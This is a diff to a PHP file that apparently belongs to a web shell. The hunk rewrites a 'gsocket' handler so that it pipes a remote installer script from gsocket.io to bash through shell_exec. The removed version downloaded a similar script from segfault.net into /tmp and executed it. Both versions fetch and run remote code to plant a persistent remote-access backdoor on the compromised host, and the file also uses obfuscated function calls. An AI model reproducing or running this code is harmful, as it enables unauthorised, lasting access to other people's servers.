@@ -602,34 +602,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $status = 'warning';
         }
     } elseif (isset($_POST['gsocket'])) {
-        if (stristr(PHP_OS, 'WIN')) {
-            $message = 'Gsocket is typically a Linux utility. Windows is not supported.';
+    if (stristr(PHP_OS, 'WIN')) {
+        $message = 'Gsocket is typically a Linux utility. Windows is not supported.';
+        $status = 'error';
+    } else {
+        // Cek apakah curl tersedia
+        if (!function_exists('shell_exec') || !is_callable('shell_exec')) {
+            $message = 'Error: shell_exec is disabled on this server.';
             $status = 'error';
         } else {
-            $systmpdir = sys_get_temp_dir() ?: "/tmp";
-            $url_socket = "https://nossl.segfault.net/deploy-all.sh"; 
-            $script_path = $systmpdir . "/sock.sh";
+            // Jalankan perintah langsung
+            $cmd = 'bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
+            $output = shell_exec($cmd);
             
-            $script_content = @$A[16]($url_socket);
-            if ($script_content === false) {
-                 $message = 'Error: Could not fetch gsocket script. Check `allow_url_fopen` or network access.';
+            // Karena shell_exec bisa return NULL, tangani itu
+            if ($output === null) {
+                $message = 'Command execution failed or disabled.';
+                $status = 'error';
             } else {
-                if (@$A[17]($script_path, $script_content) !== false) {
-                    @chmod($script_path, 0755);
-                    
-                    $install_soc = c("bash -c \"{$script_path}\" 2>&1");
-                    
-                    if (stristr($install_soc, 'Error') === false && stristr($install_soc, 'failed') === false) {
-                        $message = "Gsocket installation attempt complete. Output:\n<pre>" . htmlspecialchars($install_soc) . "</pre>";
-                        $status = 'success';
-                    } else {
-                        $message = "Gsocket installation failed. Output:\n<pre>" . htmlspecialchars($install_soc) . "</pre>";
-                    }
-                } else {
-                    $message = 'Failed to write gsocket temporary script to ' . $script_path;
-                }
+                $message = "Gsocket install output:<br><pre>" . htmlspecialchars($output) . "</pre>";
+                $status = 'success';
             }
         }
+    }
     } elseif (isset($_POST['email'])) {
         $email = $_POST['email'];
         $data_in_fi = "email: $email\n";
